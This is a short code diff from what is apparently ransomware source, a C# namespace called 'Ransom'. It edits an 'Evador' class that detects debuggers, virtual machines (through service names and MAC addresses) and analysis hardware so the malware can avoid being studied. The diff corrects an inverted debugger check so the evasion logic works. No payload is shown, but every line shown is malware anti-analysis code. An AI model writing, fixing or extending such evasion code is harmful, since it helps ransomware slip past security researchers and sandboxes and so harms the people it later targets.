@@ -21,12 +21,11 @@ namespace Ransom
 
         public Evador() { }
         
-        //Change debugger
         public async Task<bool> EvadeDetection()
         {
             runningProcesses = await Utility.RunPowershellCommand("tasklist");
             
-            if (!IsDebuggerPresent())
+            if (IsDebuggerPresent())
                 return false;
             else if (HardwareTests())
                 return false;
@@ -108,7 +107,8 @@ namespace Ransom
                 return false;
             }
         }
-
+        
+        //DO
         public async Task<bool> IsRunningOnVM()
         {
             List<string>? serviceOutput = await Utility.RunPowershellCommand("get-service", null, "Name");
@@ -138,7 +138,7 @@ namespace Ransom
                         return true;
                 }
             }
-
+           
             string macAddress = "";
             foreach (string address in MAC_ADDRESSES)
             {
